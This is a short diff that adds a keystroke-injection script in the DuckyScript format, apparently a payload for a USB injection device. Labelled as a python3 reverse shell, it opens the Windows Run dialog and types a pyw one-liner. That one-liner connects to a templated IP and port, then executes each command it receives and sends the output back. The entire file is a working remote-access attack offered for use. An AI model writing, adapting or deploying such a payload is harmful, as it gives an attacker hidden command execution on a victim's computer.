@@ -1,0 +1,10 @@
+REM Creates a reverse shell using python3
+DELAY #START_DELAY
+GUI r
+DELAY #RUN_DELAY
+STRING pyw -c "exec('import socket as s\nfrom subprocess import getoutput as g\nc=s.socket()\nc.connect((\'
+STRING #IP
+STRING \',
+STRING #PORT
+STRING ))\nwhile 1:c.send(g(c.recv(9999).decode()).encode())')"
+ENTER
